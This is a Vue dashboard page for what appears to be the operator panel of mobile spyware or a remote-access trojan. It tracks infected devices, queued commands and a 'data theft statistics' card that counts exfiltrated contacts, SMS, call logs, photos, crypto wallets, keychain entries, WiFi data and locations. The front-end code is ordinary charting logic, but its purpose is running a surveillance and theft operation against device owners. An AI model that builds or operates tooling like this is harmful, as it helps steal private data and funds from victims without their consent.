<template>
  <div class="page-container">
    <!-- Stat cards -->
    <el-row :gutter="20" class="stat-row">
      <el-col :xs="12" :sm="12" :md="6" v-for="card in statCards" :key="card.label">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-info">
              <div class="stat-value">{{ card.value }}</div>
              <div class="stat-label">{{ card.label }}</div>
            </div>
            <div class="stat-icon" :style="{ background: card.color }">
              <el-icon :size="28"><component :is="card.icon" /></el-icon>
            </div>
          </div>
        </el-card>
      </el-col>
    </el-row>

    <!-- Charts -->
    <el-row :gutter="20" style="margin-top: 20px">
      <el-col :xs="24" :md="16">
        <el-card shadow="hover">
          <template #header>
            <span>设备趋势 (近{{ days }}天)</span>
            <el-radio-group v-model="days" size="small" style="float: right" @change="loadStats">
              <el-radio-button :value="7">7天</el-radio-button>
              <el-radio-button :value="14">14天</el-radio-button>
              <el-radio-button :value="30">30天</el-radio-button>
            </el-radio-group>
          </template>
          <div ref="trendChartRef" style="height: 350px"></div>
        </el-card>
      </el-col>
      <el-col :xs="24" :md="8">
        <el-card shadow="hover">
          <template #header><span>设备状态分布</span></template>
          <div ref="pieChartRef" style="height: 350px"></div>
        </el-card>
      </el-col>
    </el-row>

    <!-- Summary -->
    <el-row :gutter="20" style="margin-top: 20px">
      <el-col :xs="24" :md="12">
        <el-card shadow="hover">
          <template #header><span>数据概览</span></template>
          <el-descriptions :column="2" border>
            <el-descriptions-item label="总设备数">{{ summary.total_devices ?? '-' }}</el-descriptions-item>
            <el-descriptions-item label="在线设备">{{ summary.online_devices ?? '-' }}</el-descriptions-item>
            <el-descriptions-item label="活跃设备">{{ summary.active_devices ?? '-' }}</el-descriptions-item>
            <el-descriptions-item label="禁用设备">{{ summary.disabled_devices ?? '-' }}</el-descriptions-item>
            <el-descriptions-item label="总渠道数">{{ summary.total_channels ?? '-' }}</el-descriptions-item>
            <el-descriptions-item label="总模板数">{{ summary.total_templates ?? '-' }}</el-descriptions-item>
            <el-descriptions-item label="总用户数">{{ summary.total_users ?? '-' }}</el-descriptions-item>
            <el-descriptions-item label="待执行命令">{{ summary.pending_commands ?? '-' }}</el-descriptions-item>
          </el-descriptions>
        </el-card>
      </el-col>
      <el-col :xs="24" :md="12">
        <el-card shadow="hover">
          <template #header><span>数据窃取统计</span></template>
          <el-descriptions :column="2" border>
            <el-descriptions-item label="联系人">{{ exfilStats.contacts ?? '-' }}</el-descriptions-item>
            <el-descriptions-item label="短信">{{ exfilStats.sms ?? '-' }}</el-descriptions-item>
            <el-descriptions-item label="通话记录">{{ exfilStats.calls ?? '-' }}</el-descriptions-item>
            <el-descriptions-item label="照片">{{ exfilStats.photos ?? '-' }}</el-descriptions-item>
            <el-descriptions-item label="钱包">{{ exfilStats.wallets ?? '-' }}</el-descriptions-item>
            <el-descriptions-item label="钥匙串">{{ exfilStats.keychain ?? '-' }}</el-descriptions-item>
            <el-descriptions-item label="WiFi">{{ exfilStats.wifi ?? '-' }}</el-descriptions-item>
            <el-descriptions-item label="位置">{{ exfilStats.location ?? '-' }}</el-descriptions-item>
          </el-descriptions>
        </el-card>
      </el-col>
    </el-row>
  </div>
</template>

<script setup lang="ts">
import { ref, reactive, onMounted, onUnmounted, nextTick } from 'vue'
import * as echarts from 'echarts'
import { dashboardApi, exfilApi, devicesApi } from '@/api/modules'

const days = ref(7)
const summary = ref<Record<string, any>>({})
const exfilStats = ref<Record<string, any>>({})
const deviceStats = ref<Record<string, any>>({})

const trendChartRef = ref<HTMLElement>()
const pieChartRef = ref<HTMLElement>()
let trendChart: echarts.ECharts | null = null
let pieChart: echarts.ECharts | null = null

const statCards = ref([
  { label: '设备总数', value: 0, icon: 'Cellphone', color: '#409EFF' },
  { label: '在线设备', value: 0, icon: 'Connection', color: '#67C23A' },
  { label: '活跃设备', value: 0, icon: 'Lightning', color: '#E6A23C' },
  { label: '待执行命令', value: 0, icon: 'Promotion', color: '#F56C6C' },
])

async function loadSummary() {
  try {
    const res: any = await dashboardApi.summary()
    summary.value = res || {}
    // Update stat cards
    statCards.value[0].value = res.total_devices ?? 0
    statCards.value[1].value = res.online_devices ?? 0
    statCards.value[2].value = res.active_devices ?? 0
    statCards.value[3].value = res.pending_commands ?? 0
  } catch {
    // ignore
  }
}

async function loadStats() {
  try {
    const res: any = await dashboardApi.stats(days.value)
    renderTrendChart(res)
  } catch {
    // ignore
  }
}

async function loadDeviceStats() {
  try {
    const res: any = await devicesApi.stats()
    deviceStats.value = res || {}
    renderPieChart(res)
  } catch {
    // ignore
  }
}

async function loadExfilStats() {
  try {
    const res: any = await exfilApi.stats()
    exfilStats.value = res || {}
  } catch {
    // ignore
  }
}

function renderTrendChart(data: any) {
  if (!trendChart) return
  const dates = data?.dates || data?.labels || []
  const deviceCounts = data?.device_counts || data?.devices || []
  const newDeviceCounts = data?.new_devices || data?.new_device_counts || []

  trendChart.setOption({
    tooltip: { trigger: 'axis' },
    legend: { data: ['设备总数', '新增设备'] },
    grid: { left: '3%', right: '4%', bottom: '3%', containLabel: true },
    xAxis: { type: 'category', data: dates, boundaryGap: false },
    yAxis: { type: 'value' },
    series: [
      { name: '设备总数', type: 'line', smooth: true, data: deviceCounts, areaStyle: { opacity: 0.3 } },
      { name: '新增设备', type: 'bar', data: newDeviceCounts },
    ],
  })
}

function renderPieChart(data: any) {
  if (!pieChart) return
  const statusMap: Record<string, string> = {
    online: '在线',
    offline: '离线',
    active: '活跃',
    disabled: '禁用',
  }
  const pieData: any[] = []
  if (data) {
    for (const [key, val] of Object.entries(data)) {
      if (typeof val === 'number' && statusMap[key]) {
        pieData.push({ name: statusMap[key], value: val })
      }
    }
  }
  // Fallback if no data
  if (pieData.length === 0) {
    pieData.push({ name: '在线', value: 0 })
    pieData.push({ name: '离线', value: 0 })
  }

  pieChart.setOption({
    tooltip: { trigger: 'item', formatter: '{a} <br/>{b}: {c} ({d}%)' },
    legend: { bottom: '5%' },
    series: [
      {
        name: '设备状态',
        type: 'pie',
        radius: ['40%', '70%'],
        avoidLabelOverlap: false,
        label: { show: false, position: 'center' },
        emphasis: { label: { show: true, fontSize: '18', fontWeight: 'bold' } },
        labelLine: { show: false },
        data: pieData,
      },
    ],
  })
}

function initCharts() {
  if (trendChartRef.value) {
    trendChart = echarts.init(trendChartRef.value)
  }
  if (pieChartRef.value) {
    pieChart = echarts.init(pieChartRef.value)
  }
}

function handleResize() {
  trendChart?.resize()
  pieChart?.resize()
}

onMounted(async () => {
  await nextTick()
  initCharts()
  window.addEventListener('resize', handleResize)
  await Promise.all([loadSummary(), loadStats(), loadDeviceStats(), loadExfilStats()])
})

onUnmounted(() => {
  window.removeEventListener('resize', handleResize)
  trendChart?.dispose()
  pieChart?.dispose()
})
</script>

<style scoped>
.stat-row {
  margin-bottom: 0;
}
</style>
